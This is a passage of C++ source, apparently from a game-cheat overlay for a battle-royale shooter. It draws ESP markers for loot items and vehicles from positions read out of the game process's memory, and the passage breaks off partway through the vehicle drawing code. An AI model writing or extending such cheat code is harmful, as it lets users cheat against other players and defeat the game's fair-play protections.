														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Chekpad_Sniper_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Chekpad_Sniper_Color[0], Setting::Esp_Item_Chekpad_Sniper_Color[1], Setting::Esp_Item_Chekpad_Sniper_Color[2], Setting::Esp_Item_Chekpad_Sniper_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Duckbill && Item.Name == u8"ﻦﺠﺗﻮﺷ ﻞﻴﺑ ﻙﺍﺩ")
												{
													if (Setting::Esp_Item_Duckbill_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::DuckBill, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::DuckBill, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Duckbill_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Duckbill_Color[0], Setting::Esp_Item_Duckbill_Color[1], Setting::Esp_Item_Duckbill_Color[2], Setting::Esp_Item_Duckbill_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Choke && Item.Name == u8"ﻦﺠﺗﻮﺷ ﻙﻮﺷ")
												{
													if (Setting::Esp_Item_Choke_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Choke, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Choke, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Choke_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Choke_Color[0], Setting::Esp_Item_Choke_Color[1], Setting::Esp_Item_Choke_Color[2], Setting::Esp_Item_Choke_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Quick_Extended && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﻊﻳﺮﺳ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_Sniper_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Quick_Extended_Color[0], Setting::Esp_Item_Sniper_Quick_Extended_Color[1], Setting::Esp_Item_Sniper_Quick_Extended_Color[2], Setting::Esp_Item_Sniper_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Extended && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_Sniper_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Extended_Color[0], Setting::Esp_Item_Sniper_Extended_Color[1], Setting::Esp_Item_Sniper_Extended_Color[2], Setting::Esp_Item_Sniper_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Quick && Item.Name == u8"ﺮﺒﻳﺎﻨﺳ ﻊﻳﺮﺳ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_Sniper_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Quick_Color[0], Setting::Esp_Item_Sniper_Quick_Color[1], Setting::Esp_Item_Sniper_Quick_Color[2], Setting::Esp_Item_Sniper_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Quick && Item.Name == u8"ﺭﺍ ﻱﺍ ﻊﻳﺮﺳ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_AR_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Color[0], Setting::Esp_Item_AR_Quick_Color[1], Setting::Esp_Item_AR_Quick_Color[2], Setting::Esp_Item_AR_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Quick_Extended && Item.Name == u8"ﺭﺍ ﻱﺍ ﻊﻳﺮﺳ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_AR_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Extended_Color[0], Setting::Esp_Item_AR_Quick_Extended_Color[1], Setting::Esp_Item_AR_Quick_Extended_Color[2], Setting::Esp_Item_AR_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Extended && Item.Name == u8"ﺭﺍ ﻱﺍ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_AR_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Extended_Color[0], Setting::Esp_Item_AR_Extended_Color[1], Setting::Esp_Item_AR_Extended_Color[2], Setting::Esp_Item_AR_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Quick_Extended && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﻊﻳﺮﺳ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_SMG_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Quick_Extended_Color[0], Setting::Esp_Item_SMG_Quick_Extended_Color[1], Setting::Esp_Item_SMG_Quick_Extended_Color[2], Setting::Esp_Item_SMG_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Extended && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_SMG_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Extended_Color[0], Setting::Esp_Item_SMG_Extended_Color[1], Setting::Esp_Item_SMG_Extended_Color[2], Setting::Esp_Item_SMG_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Quick && Item.Name == u8"ﻲﺟ ﻡﺍ ﺱﺍ ﻊﻳﺮﺳ ﻥﺰﺨﻣ")
												{
													if (Setting::Esp_Item_SMG_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Quick_Color[0], Setting::Esp_Item_SMG_Quick_Color[1], Setting::Esp_Item_SMG_Quick_Color[2], Setting::Esp_Item_SMG_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_CrossBow_Quick && Item.Name == u8"CrossBow_Quick")
												{
													if (Setting::Esp_Item_CrossBow_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::CrossbowQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::CrossbowQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_CrossBow_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_CrossBow_Quick_Color[0], Setting::Esp_Item_CrossBow_Quick_Color[1], Setting::Esp_Item_CrossBow_Quick_Color[2], Setting::Esp_Item_CrossBow_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Micro_UZI && Item.Name == u8"ﻱﺯﻭﺍ ﺔﻌﻄﻗ")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Micro_UZI_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Micro_UZI_Color[0], Setting::Esp_Item_Micro_UZI_Color[1], Setting::Esp_Item_Micro_UZI_Color[2], Setting::Esp_Item_Micro_UZI_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Holo && Item.Name == u8"ﻮﻟﻮﻫ")
												{
													if (Setting::Esp_Item_Holo_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Holo, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Holo, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Holo_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Holo_Color[0], Setting::Esp_Item_Holo_Color[1], Setting::Esp_Item_Holo_Color[2], Setting::Esp_Item_Holo_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Lazer && Item.Name == u8"ﺕﻭﺩ ﺪﻳﺭ")
												{
													if (Setting::Esp_Item_Lazer_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::RedDot, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::RedDot, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Lazer_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Lazer_Color[0], Setting::Esp_Item_Lazer_Color[1], Setting::Esp_Item_Lazer_Color[2], Setting::Esp_Item_Lazer_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_M249 && Item.Name == u8"ﻲﺴﻴﻜﻴﺑ")
												{
													if (Setting::Esp_Item_M249_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::M249, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::M249, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M249_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M249_Color[0], Setting::Esp_Item_M249_Color[1], Setting::Esp_Item_M249_Color[2], Setting::Esp_Item_M249_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mk12 && Item.Name == u8"12ﻲﻛ ﻡﺍ")
												{
													if (Setting::Esp_Item_Mk12_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk12, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk12, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk14_Color[0], Setting::Esp_Item_Mk14_Color[1], Setting::Esp_Item_Mk14_Color[2], Setting::Esp_Item_Mk14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mk14 && Item.Name == u8"14 ﻲﻛ ﻡﺍ")
												{
													if (Setting::Esp_Item_Mk14_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk14_Color[0], Setting::Esp_Item_Mk14_Color[1], Setting::Esp_Item_Mk14_Color[2], Setting::Esp_Item_Mk14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AMR && Item.Name == u8"ﺭﺍ ﻡﺍ ﻱﺍ")
												{
													if (Setting::Esp_Item_AMR_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::AMR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::AMR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AMR_Color[0], Setting::Esp_Item_AMR_Color[1], Setting::Esp_Item_AMR_Color[2], Setting::Esp_Item_AMR_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_BulletAMR && Item.Name == u8"ﺭﺍ ﻡﺍ ﻱﺍ ﻖﻠﻃ")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_BulletAMR_Color[0], Setting::Esp_Item_BulletAMR_Color[1], Setting::Esp_Item_BulletAMR_Color[2], Setting::Esp_Item_BulletAMR_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Helmet3 && Item.Name == u8"ﻞﻔﻟ ﺓﺫﻮﺧ 3")
												{
													if (Setting::Esp_Item_Helmet3_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet3_Color[0], Setting::Esp_Item_Helmet3_Color[1], Setting::Esp_Item_Helmet3_Color[2], Setting::Esp_Item_Helmet3_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Frag && Item.Name == u8"ﺔﻠﺒﻨﻗ")
												{
													if (Setting::Esp_Item_Frag_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Frag_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Frag_Color[0], Setting::Esp_Item_Frag_Color[1], Setting::Esp_Item_Frag_Color[2], Setting::Esp_Item_Frag_Color[3]), true);
													continue;
													//}

												}
												if (Setting::Esp_Item_Molotof && Item.Name == u8"ﻑﻮﺗﻮﻟﻮﻣ")
												{
													if (Setting::Esp_Item_Molotof_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Molotof_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Molotof_Color[0], Setting::Esp_Item_Molotof_Color[1], Setting::Esp_Item_Molotof_Color[2], Setting::Esp_Item_Molotof_Color[3]), true);
													continue;
													//}
												}
												if (Item.Name == u8"ACE32")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_BulletAMR_Color[0], Setting::Esp_Item_BulletAMR_Color[1], Setting::Esp_Item_BulletAMR_Color[2], Setting::Esp_Item_BulletAMR_Color[3]), true);
													continue;
												}
											}
										}
									}
								}
							}
							if (Setting::Vehicle)
							{
								if (Data::VehicleList.size() != 0)
								{
									TempVehicalList.clear();
									TempVehicalList = Data::VehicleList;

									for (Vehicle& Vehicle : Data::VehicleList)
									{
										Vehicle.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(Vehicle.Address + Offset::RootComponent) + Offset::Position);
										if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Vehicle.Position, Screen, &Distance, ViewMatrix)) continue;
										if (Distance < 5 || Distance > 700) {
											continue;
										}
										Text = Vehicle.Name + u8" [ﺮﺘﻣ " + to_string(Distance) + "]";
										std::string hp;
										ImVec4 color;
										if (Vehicle.driving)
										{
											color = DX11::ImGui_DX11::Color::Red;
										}
										else {
											color = ImColor(Setting::vehcolor[0], Setting::vehcolor[1], Setting::vehcolor[2], Setting::vehcolor[3]);
										}
										ImVec2 TextSize = DX11::ImGui_DX11::pRegularFont->CalcTextSizeA(vehisize, FLT_MAX, 0.0f, Text.c_str());


										if (VehicleStyle == 0)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"ﺓﺮﺋﺎﻃ")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"ﺞﻟﺰﺘﻟﺍ ﺡﻮﻟ")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 84.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"ﺮﺘﺑﻮﻜﻴﻠﻫ")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
